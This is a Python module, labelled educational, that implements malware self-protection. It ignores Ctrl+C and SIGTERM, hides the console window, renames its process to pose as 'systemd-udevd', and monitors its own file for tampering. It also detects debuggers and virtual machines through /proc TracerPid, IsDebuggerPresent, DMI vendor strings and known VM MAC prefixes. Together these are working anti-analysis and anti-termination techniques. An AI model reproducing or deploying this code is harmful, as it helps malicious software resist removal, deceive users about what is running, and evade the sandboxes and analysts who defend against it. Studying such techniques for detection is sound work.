"""
Self-Protection Module
Educational implementation of anti-tampering and self-defense mechanisms
"""

import os
import sys
import time
import threading
import signal
import psutil
from pathlib import Path


class SelfProtection:
    """
    Implements various self-protection mechanisms
    Educational purpose: Demonstrates malware self-defense techniques
    """

    def __init__(self, on_tamper_callback=None):
        """
        Initialize self-protection

        Args:
            on_tamper_callback (function): Function to call when tampering detected
        """
        self.on_tamper_callback = on_tamper_callback
        self.running = False
        self.monitor_thread = None
        self.original_size = None
        self.original_hash = None
        self.watched_files = []

    def enable_all(self):
        """Enable all protection mechanisms"""
        self.disable_ctrl_c()
        self.hide_window()
        self.set_process_priority()
        self.start_integrity_monitor()

    def disable_ctrl_c(self):
        """Disable Ctrl+C termination"""
        def handler(signum, frame):
            # Ignore SIGINT (Ctrl+C)
            if self.on_tamper_callback:
                self.on_tamper_callback("SIGINT_ATTEMPT", "User attempted Ctrl+C")

        try:
            signal.signal(signal.SIGINT, handler)
            return True
        except Exception as e:
            print(f"[!] Failed to disable Ctrl+C: {e}")
            return False

    def disable_sigterm(self):
        """Disable SIGTERM (kill) signal"""
        def handler(signum, frame):
            # Ignore SIGTERM
            if self.on_tamper_callback:
                self.on_tamper_callback("SIGTERM_ATTEMPT", "Termination signal received")

        try:
            signal.signal(signal.SIGTERM, handler)
            return True
        except Exception as e:
            print(f"[!] Failed to disable SIGTERM: {e}")
            return False

    def hide_window(self):
        """Hide console window (Windows only)"""
        if sys.platform == 'win32':
            try:
                import ctypes
                # Get console window handle
                hwnd = ctypes.windll.kernel32.GetConsoleWindow()
                if hwnd:
                    # Hide window (SW_HIDE = 0)
                    ctypes.windll.user32.ShowWindow(hwnd, 0)
                    return True
            except Exception as e:
                print(f"[!] Failed to hide window: {e}")

        return False

    def set_process_priority(self, priority='low'):
        """
        Set process priority

        Args:
            priority (str): 'low', 'normal', 'high'
        """
        try:
            process = psutil.Process(os.getpid())

            if sys.platform == 'win32':
                # Windows priority classes
                priorities = {
                    'low': psutil.IDLE_PRIORITY_CLASS,
                    'normal': psutil.NORMAL_PRIORITY_CLASS,
                    'high': psutil.HIGH_PRIORITY_CLASS
                }
            else:
                # Unix nice values (lower = higher priority)
                priorities = {
                    'low': 19,
                    'normal': 0,
                    'high': -10
                }

            if priority in priorities:
                if sys.platform == 'win32':
                    process.nice(priorities[priority])
                else:
                    os.nice(priorities[priority])

                return True

        except Exception as e:
            print(f"[!] Failed to set priority: {e}")

        return False

    def start_integrity_monitor(self, check_interval=60):
        """
        Start monitoring file integrity

        Args:
            check_interval (int): Seconds between integrity checks
        """
        if self.running:
            return False

        # Get current script path and hash
        self.watched_files = [os.path.abspath(sys.argv[0])]
        self._calculate_hashes()

        self.running = True
        self.monitor_thread = threading.Thread(
            target=self._integrity_monitor_loop,
            args=(check_interval,),
            daemon=True
        )
        self.monitor_thread.start()
        return True

    def stop_integrity_monitor(self):
        """Stop integrity monitoring"""
        self.running = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=2)

    def add_watched_file(self, filepath):
        """Add a file to integrity monitoring"""
        abs_path = os.path.abspath(filepath)
        if abs_path not in self.watched_files:
            self.watched_files.append(abs_path)
            self._calculate_hashes()

    def _calculate_hashes(self):
        """Calculate hashes for watched files"""
        import hashlib

        self.file_hashes = {}

        for filepath in self.watched_files:
            try:
                if os.path.exists(filepath):
                    with open(filepath, 'rb') as f:
                        content = f.read()
                        file_hash = hashlib.sha256(content).hexdigest()
                        file_size = len(content)

                        self.file_hashes[filepath] = {
                            'hash': file_hash,
                            'size': file_size
                        }
            except Exception as e:
                print(f"[!] Failed to hash {filepath}: {e}")

    def _integrity_monitor_loop(self, check_interval):
        """Monitor file integrity"""
        import hashlib

        while self.running:
            try:
                for filepath in self.watched_files:
                    if not os.path.exists(filepath):
                        # File was deleted
                        if self.on_tamper_callback:
                            self.on_tamper_callback(
                                "FILE_DELETED",
                                f"Monitored file deleted: {filepath}"
                            )
                        continue

                    # Check if file was modified
                    try:
                        with open(filepath, 'rb') as f:
                            content = f.read()
                            current_hash = hashlib.sha256(content).hexdigest()
                            current_size = len(content)

                        if filepath in self.file_hashes:
                            original = self.file_hashes[filepath]

                            if (current_hash != original['hash'] or
                                    current_size != original['size']):
                                # File was modified
                                if self.on_tamper_callback:
                                    self.on_tamper_callback(
                                        "FILE_MODIFIED",
                                        f"Monitored file modified: {filepath}"
                                    )

                                # Update hash
                                self.file_hashes[filepath] = {
                                    'hash': current_hash,
                                    'size': current_size
                                }

                    except Exception as e:
                        print(f"[!] Integrity check error for {filepath}: {e}")

            except Exception as e:
                print(f"[!] Integrity monitor error: {e}")

            # Wait for interval
            for _ in range(check_interval):
                if not self.running:
                    break
                time.sleep(1)

    def protect_process(self):
        """Make process harder to kill"""
        try:
            process = psutil.Process(os.getpid())

            # Set process name to something innocuous
            if sys.platform != 'win32':
                try:
                    import setproctitle
                    setproctitle.setproctitle('systemd-udevd')
                except ImportError:
                    pass

            return True

        except Exception as e:
            print(f"[!] Failed to protect process: {e}")
            return False

    def create_mutex(self, mutex_name):
        """
        Create a mutex to prevent multiple instances (Windows)

        Args:
            mutex_name (str): Name of the mutex

        Returns:
            bool: True if mutex created successfully (single instance)
        """
        if sys.platform == 'win32':
            try:
                import win32event
                import win32api
                import winerror

                # Try to create mutex
                mutex = win32event.CreateMutex(None, False, mutex_name)
                last_error = win32api.GetLastError()

                if last_error == winerror.ERROR_ALREADY_EXISTS:
                    # Another instance is running
                    return False

                # Store mutex handle (don't let it be garbage collected)
                self.mutex_handle = mutex
                return True

            except ImportError:
                print("[!] pywin32 not available for mutex creation")
            except Exception as e:
                print(f"[!] Failed to create mutex: {e}")

        # Linux/Mac: use file lock
        else:
            try:
                import fcntl

                lock_file = f"/tmp/{mutex_name}.lock"
                self.lock_file_handle = open(lock_file, 'w')

                try:
                    fcntl.lockf(self.lock_file_handle, fcntl.LOCK_EX | fcntl.LOCK_NB)
                    return True
                except IOError:
                    # Another instance is running
                    return False

            except Exception as e:
                print(f"[!] Failed to create lock file: {e}")

        return False

    @staticmethod
    def is_debugger_present():
        """
        Detect if a debugger is attached

        Returns:
            bool: True if debugger detected
        """
        # Check for common debugger indicators
        debugger_detected = False

        # Check ptrace (Linux)
        if sys.platform.startswith('linux'):
            try:
                with open('/proc/self/status', 'r') as f:
                    for line in f:
                        if line.startswith('TracerPid:'):
                            tracer_pid = int(line.split(':')[1].strip())
                            if tracer_pid != 0:
                                debugger_detected = True
                                break
            except:
                pass

        # Check IsDebuggerPresent (Windows)
        elif sys.platform == 'win32':
            try:
                import ctypes
                if ctypes.windll.kernel32.IsDebuggerPresent():
                    debugger_detected = True
            except:
                pass

        # Check sys.gettrace()
        if sys.gettrace() is not None:
            debugger_detected = True

        return debugger_detected

    @staticmethod
    def detect_vm():
        """
        Detect if running in a virtual machine

        Returns:
            bool: True if VM detected
        """
        vm_indicators = [
            # VMware
            'vmware', 'vmx',
            # VirtualBox
            'virtualbox', 'vbox',
            # QEMU/KVM
            'qemu', 'kvm',
            # Hyper-V
            'microsoft corporation', 'hyper-v',
            # Parallels
            'parallels',
            # Xen
            'xen'
        ]

        # Check system manufacturer and model
        try:
            import platform
            system_info = (
                platform.system() + ' ' +
                platform.machine() + ' ' +
                platform.processor()
            ).lower()

            for indicator in vm_indicators:
                if indicator in system_info:
                    return True

        except:
            pass

        # Check DMI info (Linux)
        if sys.platform.startswith('linux'):
            try:
                dmi_files = [
                    '/sys/class/dmi/id/product_name',
                    '/sys/class/dmi/id/sys_vendor',
                    '/sys/class/dmi/id/bios_vendor'
                ]

                for dmi_file in dmi_files:
                    if os.path.exists(dmi_file):
                        with open(dmi_file, 'r') as f:
                            content = f.read().lower()
                            for indicator in vm_indicators:
                                if indicator in content:
                                    return True

            except:
                pass

        # Check MAC address for known VM vendors
        try:
            import uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                            for elements in range(0, 2 * 6, 2)][::-1])

            vm_mac_prefixes = [
                '00:05:69',  # VMware
                '00:0c:29',  # VMware
                '00:1c:14',  # VMware
                '00:50:56',  # VMware
                '08:00:27',  # VirtualBox
                '52:54:00',  # QEMU/KVM
            ]

            for prefix in vm_mac_prefixes:
                if mac.startswith(prefix):
                    return True

        except:
            pass

        return False
